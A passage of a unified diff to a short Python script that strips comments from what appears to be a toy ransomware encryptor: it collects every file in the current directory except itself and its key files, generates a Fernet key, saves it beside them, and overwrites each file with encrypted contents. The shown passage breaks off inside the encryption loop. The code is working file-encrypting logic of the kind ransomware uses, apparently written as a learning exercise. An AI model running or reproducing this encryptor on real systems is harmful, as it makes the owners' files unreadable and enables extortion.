@@ -9,21 +9,21 @@ from cryptography.fernet import Fernet
 files = []
 for file in os.listdir():
     if file == "encrypt.py" or file == "theKey.key" or file == "deCrypt.py":
-        continue #This means ignore the voldemort and key file 
-    if os.path.isfile(file): # This ignore the Directories, and just uses the files (.txt)
+        continue 
+    if os.path.isfile(file):
         files.append(file)
 print(files)
 
 
 #THIS GENERATES A KEY FOR ENCRYPTION
 key = Fernet.generate_key()
-with open("theKey.key", "wb") as theKey: #wb means Write Binary && Open function creates a new file and writes unto it
+with open("theKey.key", "wb") as theKey:
     theKey.write(key)
 
 
 #THIS CODE ENCRYPTS THE FILES WITH OUR GENERATED KEY
 for file in files:
-    with open(file, "rb") as theFile: #rb means Read Binary 
+    with open(file, "rb") as theFile:
         contents = theFile.read()
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as theFile:
